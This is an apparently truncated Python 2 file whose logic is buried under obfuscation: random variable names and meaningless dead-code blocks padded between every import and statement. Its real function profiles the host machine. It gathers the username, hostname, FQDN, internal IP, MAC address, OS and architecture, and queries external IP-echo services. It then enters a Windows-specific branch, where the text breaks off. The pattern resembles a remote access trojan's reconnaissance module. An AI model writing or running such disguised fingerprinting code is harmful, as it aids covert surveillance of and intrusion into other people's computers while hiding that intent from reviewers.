# -*- coding: utf-8 -*-

jFTPpKDSykKijYyKxZLipJlVjuCqKrTh = 'dXTEDusNjvYTvmTDnmJJVwQWnXkEsOLm'
cAboKCatwVZxlwFJGEJYktXNxAwYpnKl = 'iAVYdvXcBCHefVPYQMOhvRlWEoHdSAQL'
JxJYypaKKcwKMyyeeSEgBCJteWxfqqkB = 'BRwWIFeZEdzRRWtIdJyNoaKYAJAMMUAl'
duObtSZThiXERMuSSnPgECsFAHansXak = 'MGnlbnfeUUeRkuaQIoljAJlAqTSiGXSl'
JrCoCmxhjlNpQvYpoCAFupzUQjJADbBR = 'VfzEJryVSBQFKSajGyGTHtAgqEABEXaN'
WodQZGXqXYxSjUYYHmexqKRblFCeDpVx = 'FkrgGrTNWuuMmPpBxfFcdBncPimfbMWN'
if JxJYypaKKcwKMyyeeSEgBCJteWxfqqkB == duObtSZThiXERMuSSnPgECsFAHansXak:
    for WodQZGXqXYxSjUYYHmexqKRblFCeDpVx in JrCoCmxhjlNpQvYpoCAFupzUQjJADbBR:
        if WodQZGXqXYxSjUYYHmexqKRblFCeDpVx == duObtSZThiXERMuSSnPgECsFAHansXak:
            JrCoCmxhjlNpQvYpoCAFupzUQjJADbBR = jFTPpKDSykKijYyKxZLipJlVjuCqKrTh
        else:
            duObtSZThiXERMuSSnPgECsFAHansXak = cAboKCatwVZxlwFJGEJYktXNxAwYpnKl
import ctypes

cFKtOZhpBLHATbJgaYtykkjOeQCuHsBP = 'vZLQznwkUMdsaxLAuPXdbCvkfdifEdtM'
xEobvdtEDjMTqAYAqudlsyzhFmnlgdyA = 'LCKUSNGGwZrLxIkJyVzLptJgocISKfhv'
hDstYTRLLCrcsTFZsNJNBCKfgkkFIBwR = 'glBBugRKiCzmwpBhNKcntETvUHTlgsDN'
hfeHJaoOKPSvZGzDUyOvdxxBFNVltTdM = 'NYhzXFaSEgFFhMzsoEdhHLDGNfcvxDCp'
sNninJAnYgMrRRxNklZJGNGbQMQGOwhd = 'ALOsEpVADAsNhSQKlrNcCXIJGodcammw'
FPFGPWlyyEWdbpzKADKbHQHzGMnmyAca = 'pWGWMJOAEAthUNNWQwqIYZNaFOwvcCWN'
if hDstYTRLLCrcsTFZsNJNBCKfgkkFIBwR == hfeHJaoOKPSvZGzDUyOvdxxBFNVltTdM:
    for FPFGPWlyyEWdbpzKADKbHQHzGMnmyAca in sNninJAnYgMrRRxNklZJGNGbQMQGOwhd:
        if FPFGPWlyyEWdbpzKADKbHQHzGMnmyAca == hfeHJaoOKPSvZGzDUyOvdxxBFNVltTdM:
            sNninJAnYgMrRRxNklZJGNGbQMQGOwhd = cFKtOZhpBLHATbJgaYtykkjOeQCuHsBP
        else:
            hfeHJaoOKPSvZGzDUyOvdxxBFNVltTdM = xEobvdtEDjMTqAYAqudlsyzhFmnlgdyA
import getpass

YPoEkqxrHvthrrGWdwGrltiWnrNbKwYO = 'liDssqCUazuWcEzOdMHCZWdBsrtRFvly'
uQrPGQyOJUuZNEjomWIFkwNfqYLfzdDi = 'NWTIuLqysdIrxLgQXXhVsVdBpkXStSXD'
yjJncBKENrtlrtoSbmQBLokgLDflNefU = 'KiUZFPmjMcfMiraaKJppNNCiylwsgVCU'
VbWFQOGqloNYVdwnqiFMylbUbdZEVwmV = 'MmeAfvjLCeUwQmIFkawdOuTNXlwOTWFO'
GsgKgHpBPuqJXXEqwmFnJfjXsduocytc = 'EFLkYNFmYAlOsHeiIzRMxwduJuIIdylC'
if YPoEkqxrHvthrrGWdwGrltiWnrNbKwYO in uQrPGQyOJUuZNEjomWIFkwNfqYLfzdDi:
    YPoEkqxrHvthrrGWdwGrltiWnrNbKwYO = GsgKgHpBPuqJXXEqwmFnJfjXsduocytc
    if uQrPGQyOJUuZNEjomWIFkwNfqYLfzdDi in yjJncBKENrtlrtoSbmQBLokgLDflNefU:
        uQrPGQyOJUuZNEjomWIFkwNfqYLfzdDi = VbWFQOGqloNYVdwnqiFMylbUbdZEVwmV
elif uQrPGQyOJUuZNEjomWIFkwNfqYLfzdDi in YPoEkqxrHvthrrGWdwGrltiWnrNbKwYO:
    yjJncBKENrtlrtoSbmQBLokgLDflNefU = uQrPGQyOJUuZNEjomWIFkwNfqYLfzdDi
    if yjJncBKENrtlrtoSbmQBLokgLDflNefU in uQrPGQyOJUuZNEjomWIFkwNfqYLfzdDi:
        uQrPGQyOJUuZNEjomWIFkwNfqYLfzdDi = GsgKgHpBPuqJXXEqwmFnJfjXsduocytc
import os

yOVdewnHRjrZJxaNgzHYuFgPUsGvMfgZ = 'SReIEnWZxAkkZheCGPSNAtgFecPgEsOg'
lSkGItrBVxOVnCVdHimRBOgXjgAlBoQO = 'QbgUPJBhUahXxacbPBKLjlRcbUmtkyhM'
if yOVdewnHRjrZJxaNgzHYuFgPUsGvMfgZ != lSkGItrBVxOVnCVdHimRBOgXjgAlBoQO:
    yOVdewnHRjrZJxaNgzHYuFgPUsGvMfgZ = 'QbgUPJBhUahXxacbPBKLjlRcbUmtkyhM'
    lSkGItrBVxOVnCVdHimRBOgXjgAlBoQO = yOVdewnHRjrZJxaNgzHYuFgPUsGvMfgZ
    yOVdewnHRjrZJxaNgzHYuFgPUsGvMfgZ = 'SReIEnWZxAkkZheCGPSNAtgFecPgEsOg'
import platform

SokvKcLAvuNdAEiYQKiwSLDAYEnIivlL = 'uMyyKmPBFzlCpiEhHtjDfkgwTPyDSnZT'
KUfibdItaYRtONxyqjpGlnwEnVOivYKH = 'zmiXzcpPZVDnVebLcbdKuFADRqqCZBmW'
if SokvKcLAvuNdAEiYQKiwSLDAYEnIivlL != KUfibdItaYRtONxyqjpGlnwEnVOivYKH:
    SokvKcLAvuNdAEiYQKiwSLDAYEnIivlL = 'zmiXzcpPZVDnVebLcbdKuFADRqqCZBmW'
    KUfibdItaYRtONxyqjpGlnwEnVOivYKH = SokvKcLAvuNdAEiYQKiwSLDAYEnIivlL
    SokvKcLAvuNdAEiYQKiwSLDAYEnIivlL = 'uMyyKmPBFzlCpiEhHtjDfkgwTPyDSnZT'
import socket

MLYVojkcLfpjgQCdwzCscyfWDrPFTFjX = 'wSYGJULqfSnfXomMXLKWVYgqxyJmuoGF'
zVBizjZTynNVqQNqtqvsumEplAIxHqjZ = 'yHNdvhyfEgSTUOitZicljletPdFikfdT'
yWytPopOJjrYaIOwxEiEeoeSXSbZCyYu = 'zoLLNqEDQiMYJTwxFCmiAZyLRHfPBauW'
uxwrSBotboBUQYKKcJOGjUePgRUwesIw = 'IJPmpekUzZqzfYsPcqPJtHDggxAaoWOp'
jPEfFvmDoAIzdFiuIrwDDvPgEscEnpGd = 'CljbLRowaoKMCYpEcwhYvsNGoVmGgUjs'
if MLYVojkcLfpjgQCdwzCscyfWDrPFTFjX in zVBizjZTynNVqQNqtqvsumEplAIxHqjZ:
    MLYVojkcLfpjgQCdwzCscyfWDrPFTFjX = jPEfFvmDoAIzdFiuIrwDDvPgEscEnpGd
    if zVBizjZTynNVqQNqtqvsumEplAIxHqjZ in yWytPopOJjrYaIOwxEiEeoeSXSbZCyYu:
        zVBizjZTynNVqQNqtqvsumEplAIxHqjZ = uxwrSBotboBUQYKKcJOGjUePgRUwesIw
elif zVBizjZTynNVqQNqtqvsumEplAIxHqjZ in MLYVojkcLfpjgQCdwzCscyfWDrPFTFjX:
    yWytPopOJjrYaIOwxEiEeoeSXSbZCyYu = zVBizjZTynNVqQNqtqvsumEplAIxHqjZ
    if yWytPopOJjrYaIOwxEiEeoeSXSbZCyYu in zVBizjZTynNVqQNqtqvsumEplAIxHqjZ:
        zVBizjZTynNVqQNqtqvsumEplAIxHqjZ = jPEfFvmDoAIzdFiuIrwDDvPgEscEnpGd
import urllib

JTyluHKZKJPsghSjaAGtFAsQuLBqraAN = 'QsjVCUWXefhbrxbAYBXqIziKEZKLJOzr'
dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw = 'UnHbTgoCaLsDMDWwpAMyyWQMsHCVEokB'
TZXAJGPrDBCywasboTgqozbOHbhoJmiY = 'jHsGTGPcpVTTPWUuvILMEgeoArEGmhyP'
DhnTCALRcGJMudUqeYqrDhXkraJMwFUg = 'zcpydQXLNxsWhtdsPVrRCjUcFHzEDWtQ'
if dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw == JTyluHKZKJPsghSjaAGtFAsQuLBqraAN:
    for JTyluHKZKJPsghSjaAGtFAsQuLBqraAN in dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw:
        if dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw == dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw:
            TZXAJGPrDBCywasboTgqozbOHbhoJmiY = 'DhnTCALRcGJMudUqeYqrDhXkraJMwFUg'
        elif TZXAJGPrDBCywasboTgqozbOHbhoJmiY == DhnTCALRcGJMudUqeYqrDhXkraJMwFUg:
            DhnTCALRcGJMudUqeYqrDhXkraJMwFUg = JTyluHKZKJPsghSjaAGtFAsQuLBqraAN
        else:
            JTyluHKZKJPsghSjaAGtFAsQuLBqraAN = dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw
elif TZXAJGPrDBCywasboTgqozbOHbhoJmiY == TZXAJGPrDBCywasboTgqozbOHbhoJmiY:
    for TZXAJGPrDBCywasboTgqozbOHbhoJmiY in dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw:
        if DhnTCALRcGJMudUqeYqrDhXkraJMwFUg == dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw:
            TZXAJGPrDBCywasboTgqozbOHbhoJmiY = 'DhnTCALRcGJMudUqeYqrDhXkraJMwFUg'
        elif TZXAJGPrDBCywasboTgqozbOHbhoJmiY == DhnTCALRcGJMudUqeYqrDhXkraJMwFUg:
            DhnTCALRcGJMudUqeYqrDhXkraJMwFUg = JTyluHKZKJPsghSjaAGtFAsQuLBqraAN
        else:
            JTyluHKZKJPsghSjaAGtFAsQuLBqraAN = dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw
            for TZXAJGPrDBCywasboTgqozbOHbhoJmiY in dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw:
                if DhnTCALRcGJMudUqeYqrDhXkraJMwFUg == dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw:
                    TZXAJGPrDBCywasboTgqozbOHbhoJmiY = 'DhnTCALRcGJMudUqeYqrDhXkraJMwFUg'
                elif TZXAJGPrDBCywasboTgqozbOHbhoJmiY == DhnTCALRcGJMudUqeYqrDhXkraJMwFUg:
                    DhnTCALRcGJMudUqeYqrDhXkraJMwFUg = JTyluHKZKJPsghSjaAGtFAsQuLBqraAN
                else:
                    JTyluHKZKJPsghSjaAGtFAsQuLBqraAN = DhnTCALRcGJMudUqeYqrDhXkraJMwFUg
else:
    JTyluHKZKJPsghSjaAGtFAsQuLBqraAN = dZEGaLUPxSmsGrJPjREeRuFqcSWCoCOw
import uuid

UhCkbuEOsxGwxpxXUtnnOcDPKUjELEDz = 'uqwOODbUxffTiQTwGzsrrqMuRjvNAZrt'
GXdLUEuqHtNWsfzHVABXOvBiDkHqEJoT = 'fvANXBBXMugJYYsgosQlCVsGHOVnjmPS'
elSmpSTuitjBQOPGUpAqLUlHquJtwEHL = 'ShWetAJVOmUczmtErpgwvZaaWizilMDb'
zHrPvOMSVbaesZEWNOHyvOjCMRSaAmdi = 'GmFpywKklfzWTzrmaANNHVGhzVpqqGqA'
LvyhRYRLCuxDHWvZUOVjJOuFZByISKlz = 'czLMUIWhUiyNIHUnckSwDnkpIdAibJpN'
if UhCkbuEOsxGwxpxXUtnnOcDPKUjELEDz in GXdLUEuqHtNWsfzHVABXOvBiDkHqEJoT:
    UhCkbuEOsxGwxpxXUtnnOcDPKUjELEDz = LvyhRYRLCuxDHWvZUOVjJOuFZByISKlz
    if GXdLUEuqHtNWsfzHVABXOvBiDkHqEJoT in elSmpSTuitjBQOPGUpAqLUlHquJtwEHL:
        GXdLUEuqHtNWsfzHVABXOvBiDkHqEJoT = zHrPvOMSVbaesZEWNOHyvOjCMRSaAmdi
elif GXdLUEuqHtNWsfzHVABXOvBiDkHqEJoT in UhCkbuEOsxGwxpxXUtnnOcDPKUjELEDz:
    elSmpSTuitjBQOPGUpAqLUlHquJtwEHL = GXdLUEuqHtNWsfzHVABXOvBiDkHqEJoT
    if elSmpSTuitjBQOPGUpAqLUlHquJtwEHL in GXdLUEuqHtNWsfzHVABXOvBiDkHqEJoT:
        GXdLUEuqHtNWsfzHVABXOvBiDkHqEJoT = LvyhRYRLCuxDHWvZUOVjJOuFZByISKlz
def CjVxWcOTrRVtfhmLQPYezPvfvjIoelab(plat_type):
    loCUJpHFjgpbaXvOXybmAFmpYHefHalj = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    rLNbmAMlddLSemRvSyhCUujqAGRnklTf = getpass.getuser()
    aldWdknYUmPtYxzGFLMPIfgMCpOcKmIT    = socket.gethostname()
    UeurXdWXiqUdXysVCXgObSoVUrtAvPKi        = socket.getfqdn()
    oYgFadnHAzfXwdIoXQDdXPLXxpdFvvbI = socket.gethostbyname(aldWdknYUmPtYxzGFLMPIfgMCpOcKmIT)
    aKKeTeBdHqVIHLJMYQCBePvqOfAbMDHX     = uuid.getnode()
    gWEMKayPqmsanaYDuZfDCHRurbVMYIFl         = ':'.join(("%012X" % aKKeTeBdHqVIHLJMYQCBePvqOfAbMDHX)[ZtZphMLIBRKhfmGXFtBJEyVKGtjKoWNI:ZtZphMLIBRKhfmGXFtBJEyVKGtjKoWNI+2] for ZtZphMLIBRKhfmGXFtBJEyVKGtjKoWNI in range(0, 12, 2))
    NrxZazGeepBaFWoPAoYftKzIZhxLGrte = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    wxszCGeHAghkjrGHEilkReDOwtmBtfZB = ''

    tUPMGtzhdMqcANMHHNbRpeIuzvKRCNrr = 'KWwshupHzvQyKDpJPYnlHGxkRaoeTrvV'
    NikTLWNxtZKTNCgTvPZlHkHxHEcRxmKq = 'AIPKvBbWDjybDOGdsMtrtGkglBoZdqlD'
    CSyBrKBbnuGNmcvjhKcqNknwwJceltWh = 'erYQzIxKUBdFNxvvqKBqTyUZWNpMQoov'
    afddXtJjtFzqKdRsSEcTdPxrSIWoVdVS = 'WbopehwnFmoVlpWAxMDzxqWbrGlUKHkX'
    FtgEilnJRjhEZScKdbRrppNDZBbHtalt = 'tzUgjpnckiyrmflGNTGfmnQFXMipOVmL'
    kBNjkCoORUrhnvkbnuTwMRtHWvZyzgyC = 'DCFGsdJvRehivuzAaqXOmOnhirUINeaf'
    if CSyBrKBbnuGNmcvjhKcqNknwwJceltWh == afddXtJjtFzqKdRsSEcTdPxrSIWoVdVS:
        for kBNjkCoORUrhnvkbnuTwMRtHWvZyzgyC in FtgEilnJRjhEZScKdbRrppNDZBbHtalt:
            if kBNjkCoORUrhnvkbnuTwMRtHWvZyzgyC == afddXtJjtFzqKdRsSEcTdPxrSIWoVdVS:
                FtgEilnJRjhEZScKdbRrppNDZBbHtalt = tUPMGtzhdMqcANMHHNbRpeIuzvKRCNrr
            else:
                afddXtJjtFzqKdRsSEcTdPxrSIWoVdVS = NikTLWNxtZKTNCgTvPZlHkHxHEcRxmKq
    for uEeycrPvTKJsHsbxlUNfEFHcvBGqkffT in NrxZazGeepBaFWoPAoYftKzIZhxLGrte:

        try:
            DRSvNoJJnSRxNciZYRqNcAaIBEJoZaTm = 'MRxsbDSUbNjnXWoDIGlOEiBmXBlLdgkf'
            mjnjyMTDZcPapWBaPMRRZHEHlqhPhiTB = 'ovnHGsJuCNRihiAnPIEUoAHwwWZeuzwA'
            iLlsILUwFCnVZChJNTYLVRTxiACTNlZy = 'xGefTtgLBWzoiiRivcrSWvOUVevgjDFx'
            ivcoayLZMrYuIfUtkSNzzPVrsJShczXd = 'SrtsTuAxLAijGRXRqYcyGgFTltuvLkuw'
            WhMstjPKTuupHowqrfbJInAAPBkkyxNf = 'dVQluYofnLRVgZtgpMYxkCBVHJNYKTbn'
            RoJnfDEWMhTkgSjFFbvMkFvoWNFsFnOV = 'smUYIsRMyQLQsczzQHdUumFBJcDzuqyE'
            HCeQppFqNoBIdcGXuAdyzhPzMguvJvxy = [
                    'MRxsbDSUbNjnXWoDIGlOEiBmXBlLdgkf',
                    'xGefTtgLBWzoiiRivcrSWvOUVevgjDFx',
                    'dVQluYofnLRVgZtgpMYxkCBVHJNYKTbn',
                    'tKNgUmPBVgGIABmIGxfFFlZOdbGgHiDZ'
            ]
            for DRSvNoJJnSRxNciZYRqNcAaIBEJoZaTm in RoJnfDEWMhTkgSjFFbvMkFvoWNFsFnOV:
                for mjnjyMTDZcPapWBaPMRRZHEHlqhPhiTB in iLlsILUwFCnVZChJNTYLVRTxiACTNlZy:
                    if ivcoayLZMrYuIfUtkSNzzPVrsJShczXd == WhMstjPKTuupHowqrfbJInAAPBkkyxNf:
                        mjnjyMTDZcPapWBaPMRRZHEHlqhPhiTB = DRSvNoJJnSRxNciZYRqNcAaIBEJoZaTm
                    elif WhMstjPKTuupHowqrfbJInAAPBkkyxNf == mjnjyMTDZcPapWBaPMRRZHEHlqhPhiTB:
                        mjnjyMTDZcPapWBaPMRRZHEHlqhPhiTB = RoJnfDEWMhTkgSjFFbvMkFvoWNFsFnOV
                    else:
                        WhMstjPKTuupHowqrfbJInAAPBkkyxNf = RoJnfDEWMhTkgSjFFbvMkFvoWNFsFnOV
                        for mjnjyMTDZcPapWBaPMRRZHEHlqhPhiTB in HCeQppFqNoBIdcGXuAdyzhPzMguvJvxy:
                            iLlsILUwFCnVZChJNTYLVRTxiACTNlZy = mjnjyMTDZcPapWBaPMRRZHEHlqhPhiTB
        except Exception:
            pass
        try:

            MDvppNdAuRlCBwKUrCnmzytNYvcEdGND = 'qaVepVtukcGaVtuBaFWLoBmNAzCnJvQk'
            PNJpACZrzAZytqCYFUdjMOurYUJgjLTB = 'tfqFZNYhPHoTspnxHZGCMjTEXcXOaDGA'
            oHPPXoUGeRYprBtEmcyBZwCzNLHTXicS = 'OrQQhkGzHgSmGGQpIwkNvkOefKJQrFFm'
            if MDvppNdAuRlCBwKUrCnmzytNYvcEdGND == PNJpACZrzAZytqCYFUdjMOurYUJgjLTB:
                oHPPXoUGeRYprBtEmcyBZwCzNLHTXicS = 'OrQQhkGzHgSmGGQpIwkNvkOefKJQrFFm'
                oHPPXoUGeRYprBtEmcyBZwCzNLHTXicS = MDvppNdAuRlCBwKUrCnmzytNYvcEdGND
            else:
                oHPPXoUGeRYprBtEmcyBZwCzNLHTXicS = 'OrQQhkGzHgSmGGQpIwkNvkOefKJQrFFm'
                oHPPXoUGeRYprBtEmcyBZwCzNLHTXicS = 'qaVepVtukcGaVtuBaFWLoBmNAzCnJvQk'
            wxszCGeHAghkjrGHEilkReDOwtmBtfZB = urllib.urlopen('http://'+uEeycrPvTKJsHsbxlUNfEFHcvBGqkffT).read().rstrip()
        except IOError:

            BdPQZuUrMDouTMjjdTohCIClpXcPxTPL = 'zfrmfAXrqRnSTUDroRFeXryyvTyLBwWO'
            DcBKqVVDPvqRNgpykhRiqKldJSQDhHiW = 'DyFOECuEZoXbgRHbQoyYiTDvDHQJvKLJ'
            ibdVVQKNzFOOxnasKRRsnlKgiKmlsTHA = 'mzCudQHEOoJMQrReNXOdKfZzGkDXYDpd'
            if BdPQZuUrMDouTMjjdTohCIClpXcPxTPL == DcBKqVVDPvqRNgpykhRiqKldJSQDhHiW:
                ibdVVQKNzFOOxnasKRRsnlKgiKmlsTHA = 'mzCudQHEOoJMQrReNXOdKfZzGkDXYDpd'
                ibdVVQKNzFOOxnasKRRsnlKgiKmlsTHA = BdPQZuUrMDouTMjjdTohCIClpXcPxTPL
            else:
                ibdVVQKNzFOOxnasKRRsnlKgiKmlsTHA = 'mzCudQHEOoJMQrReNXOdKfZzGkDXYDpd'
                ibdVVQKNzFOOxnasKRRsnlKgiKmlsTHA = 'zfrmfAXrqRnSTUDroRFeXryyvTyLBwWO'
            pass

            EmNHEzumFUcCzRyEoMYkMuHwaNPEpjJR = 'yCXehZEDsflBzvVNTSoXMotkBrZurhLi'
            bISXtgWwKhNWgTxmqmytkiUMontHjMxE = 'YdQjrFuMuCMmbSAFrZqGSnLZZZAghkSP'
            azJVchWXGbURpjbOZeOQaflWUATUewcE = 'SNhJBbIdzKplDILdtywBUdbQrXoaqTdZ'
            SmVRedlMBYgYelvvvcfoHibqyFGnuMZV = 'uIYXxbRRUwJoFKQTrMunpykKUJTzKRMS'
            wiFoAvwZJnKbpVhUaFUJrTzFeXFzpWSY = 'vkerALITmHgtxXijAWaoatZPbtvkuFQp'
            VjriXiYuTxWlveZiISrVHpsJWkHrAmSs = 'xsEpVfPxLJXuJkWPpQNRaNaduGlxKsdn'
            if EmNHEzumFUcCzRyEoMYkMuHwaNPEpjJR != SmVRedlMBYgYelvvvcfoHibqyFGnuMZV:
                bISXtgWwKhNWgTxmqmytkiUMontHjMxE = azJVchWXGbURpjbOZeOQaflWUATUewcE
                for VjriXiYuTxWlveZiISrVHpsJWkHrAmSs in SmVRedlMBYgYelvvvcfoHibqyFGnuMZV:
                    if VjriXiYuTxWlveZiISrVHpsJWkHrAmSs != azJVchWXGbURpjbOZeOQaflWUATUewcE:
                        bISXtgWwKhNWgTxmqmytkiUMontHjMxE = bISXtgWwKhNWgTxmqmytkiUMontHjMxE
                    else:
                        wiFoAvwZJnKbpVhUaFUJrTzFeXFzpWSY = EmNHEzumFUcCzRyEoMYkMuHwaNPEpjJR
            else:
                azJVchWXGbURpjbOZeOQaflWUATUewcE = EmNHEzumFUcCzRyEoMYkMuHwaNPEpjJR
                EmNHEzumFUcCzRyEoMYkMuHwaNPEpjJR = wiFoAvwZJnKbpVhUaFUJrTzFeXFzpWSY
                if azJVchWXGbURpjbOZeOQaflWUATUewcE == EmNHEzumFUcCzRyEoMYkMuHwaNPEpjJR:
                    for VjriXiYuTxWlveZiISrVHpsJWkHrAmSs in EmNHEzumFUcCzRyEoMYkMuHwaNPEpjJR:
                        if VjriXiYuTxWlveZiISrVHpsJWkHrAmSs == azJVchWXGbURpjbOZeOQaflWUATUewcE:
                            azJVchWXGbURpjbOZeOQaflWUATUewcE = EmNHEzumFUcCzRyEoMYkMuHwaNPEpjJR
                        else:
                            azJVchWXGbURpjbOZeOQaflWUATUewcE = wiFoAvwZJnKbpVhUaFUJrTzFeXFzpWSY
        if wxszCGeHAghkjrGHEilkReDOwtmBtfZB and (6 < len(wxszCGeHAghkjrGHEilkReDOwtmBtfZB) < 16):

            HieQjPKQHOtrrfftUYVmTZRymDuZewwi = 'nlcYvjLwRiJtBcDncRzQBuAvsOZIEyDh'
            EbXZLIFoevDnSWWoApgpqcPvJAHubxYs = 'YtBYjrxSNBdxcevQZulXlVslllWTUCyh'
            TNyfThCUlBHMnBPAgCioHFiwWvLCDCgD = 'acXfRONSAkaywSsKwmIIlblOdmnULEFr'
            SPkpsgYHTufaClkVXuLdNtGuiZUPGcii = 'ZYKdImWuFISURtCwAPDGeMikOUaJlPDr'
            JbPOwMOhFUGzsGFkoMNkEJjRZWiMrcvU = 'hzusKVKYrDcJHeIxOlHHZccVxnObEnJo'
            if HieQjPKQHOtrrfftUYVmTZRymDuZewwi in EbXZLIFoevDnSWWoApgpqcPvJAHubxYs:
                HieQjPKQHOtrrfftUYVmTZRymDuZewwi = JbPOwMOhFUGzsGFkoMNkEJjRZWiMrcvU
                if EbXZLIFoevDnSWWoApgpqcPvJAHubxYs in TNyfThCUlBHMnBPAgCioHFiwWvLCDCgD:
                    EbXZLIFoevDnSWWoApgpqcPvJAHubxYs = SPkpsgYHTufaClkVXuLdNtGuiZUPGcii
            elif EbXZLIFoevDnSWWoApgpqcPvJAHubxYs in HieQjPKQHOtrrfftUYVmTZRymDuZewwi:
                TNyfThCUlBHMnBPAgCioHFiwWvLCDCgD = EbXZLIFoevDnSWWoApgpqcPvJAHubxYs
                if TNyfThCUlBHMnBPAgCioHFiwWvLCDCgD in EbXZLIFoevDnSWWoApgpqcPvJAHubxYs:
                    EbXZLIFoevDnSWWoApgpqcPvJAHubxYs = JbPOwMOhFUGzsGFkoMNkEJjRZWiMrcvU
            break

            loOLMkeJFKRLtrBjeNczKVTaEtqnVqfN = 'MWKldfGCttyLURAfOIhlnbwNKFaSxdFd'
            YUXsALoLcCgaWeNFZZoAWqogamkrIbDN = 'AVPNQGvIKnIyHdFpaNVGRGwFKQXctqZH'
            TCfxKVPIbfSWLKYUieNXRQARTHuIZAUJ = 'hwFYzFRsqvkORnDxVkprDbsNAVvvfqHF'
            IeVFKSaolRgBUHtCaGTkEzseafGMqrxF = 'xzKHhxjihGeqIJeImbUniYylVZcokxdK'
            UIhEGcufitkmWmDVfEPCfuKeGQdTBmGF = 'OwnDGPUXknvPRZzMBBZyZGHKtUEYeFaS'
            if loOLMkeJFKRLtrBjeNczKVTaEtqnVqfN in YUXsALoLcCgaWeNFZZoAWqogamkrIbDN:
                loOLMkeJFKRLtrBjeNczKVTaEtqnVqfN = UIhEGcufitkmWmDVfEPCfuKeGQdTBmGF
                if YUXsALoLcCgaWeNFZZoAWqogamkrIbDN in TCfxKVPIbfSWLKYUieNXRQARTHuIZAUJ:
                    YUXsALoLcCgaWeNFZZoAWqogamkrIbDN = IeVFKSaolRgBUHtCaGTkEzseafGMqrxF
            elif YUXsALoLcCgaWeNFZZoAWqogamkrIbDN in loOLMkeJFKRLtrBjeNczKVTaEtqnVqfN:
                TCfxKVPIbfSWLKYUieNXRQARTHuIZAUJ = YUXsALoLcCgaWeNFZZoAWqogamkrIbDN
                if TCfxKVPIbfSWLKYUieNXRQARTHuIZAUJ in YUXsALoLcCgaWeNFZZoAWqogamkrIbDN:
                    YUXsALoLcCgaWeNFZZoAWqogamkrIbDN = UIhEGcufitkmWmDVfEPCfuKeGQdTBmGF
    ShQqtVBAettOOBhUlOloHejpuytLDoBJ = False

    FWaeBMwCdaApGwsuQnZwKdVnRTcosDnT = 'fsLabPKBfMipeseqLziUNEcVnTjNWWKR'
    SAiPAZmliUsrsdWcjWkQPDqOoeOBNhlb = 'RPiAkYnnpyvUOrKBvnWhmbUulbAzZeEv'
    if FWaeBMwCdaApGwsuQnZwKdVnRTcosDnT != SAiPAZmliUsrsdWcjWkQPDqOoeOBNhlb:
        FWaeBMwCdaApGwsuQnZwKdVnRTcosDnT = 'RPiAkYnnpyvUOrKBvnWhmbUulbAzZeEv'
        SAiPAZmliUsrsdWcjWkQPDqOoeOBNhlb = FWaeBMwCdaApGwsuQnZwKdVnRTcosDnT
        FWaeBMwCdaApGwsuQnZwKdVnRTcosDnT = 'fsLabPKBfMipeseqLziUNEcVnTjNWWKR'
    if plat_type.startswith('win'):

        jzRtRnMXEVLDfvxVFhHhadWVaqRmVGTD = 'UUAoVSZSvTNOtXbJuHNKdZNArmCDrCfs'
        okqIqYbJekobzdSWPnNyVSwgStFeGkDC = 'LxLMonhCNraHdyARaoqTrMoawhVfOoTE'
        ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv = 'hBmFOANbiOEwUsPfXXiAZUZIXciquOIz'
        pNUpFgFvNsljRWBYImJDEVAbgHiuyztt = 'HhylmEXBWmzFNaLiZSjHrsFjntGGcBFT'
        if okqIqYbJekobzdSWPnNyVSwgStFeGkDC == jzRtRnMXEVLDfvxVFhHhadWVaqRmVGTD:
            for jzRtRnMXEVLDfvxVFhHhadWVaqRmVGTD in okqIqYbJekobzdSWPnNyVSwgStFeGkDC:
                if okqIqYbJekobzdSWPnNyVSwgStFeGkDC == okqIqYbJekobzdSWPnNyVSwgStFeGkDC:
                    ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv = 'pNUpFgFvNsljRWBYImJDEVAbgHiuyztt'
                elif ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv == pNUpFgFvNsljRWBYImJDEVAbgHiuyztt:
                    pNUpFgFvNsljRWBYImJDEVAbgHiuyztt = jzRtRnMXEVLDfvxVFhHhadWVaqRmVGTD
                else:
                    jzRtRnMXEVLDfvxVFhHhadWVaqRmVGTD = okqIqYbJekobzdSWPnNyVSwgStFeGkDC
        elif ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv == ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv:
            for ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv in okqIqYbJekobzdSWPnNyVSwgStFeGkDC:
                if pNUpFgFvNsljRWBYImJDEVAbgHiuyztt == okqIqYbJekobzdSWPnNyVSwgStFeGkDC:
                    ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv = 'pNUpFgFvNsljRWBYImJDEVAbgHiuyztt'
                elif ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv == pNUpFgFvNsljRWBYImJDEVAbgHiuyztt:
                    pNUpFgFvNsljRWBYImJDEVAbgHiuyztt = jzRtRnMXEVLDfvxVFhHhadWVaqRmVGTD
                else:
                    jzRtRnMXEVLDfvxVFhHhadWVaqRmVGTD = okqIqYbJekobzdSWPnNyVSwgStFeGkDC
                    for ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv in okqIqYbJekobzdSWPnNyVSwgStFeGkDC:
                        if pNUpFgFvNsljRWBYImJDEVAbgHiuyztt == okqIqYbJekobzdSWPnNyVSwgStFeGkDC:
                            ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv = 'pNUpFgFvNsljRWBYImJDEVAbgHiuyztt'
                        elif ucKVpQOZxNLVVAhbeRDorOZTUlHZdHqv == pNUpFgFvNsljRWBYImJDEVAbgHiuyztt:
                            pNUpFgFvNsljRWBYImJDEVAbgHiuyztt = jzRtRnMXEVLDfvxVFhHhadWVaqRmVGTD
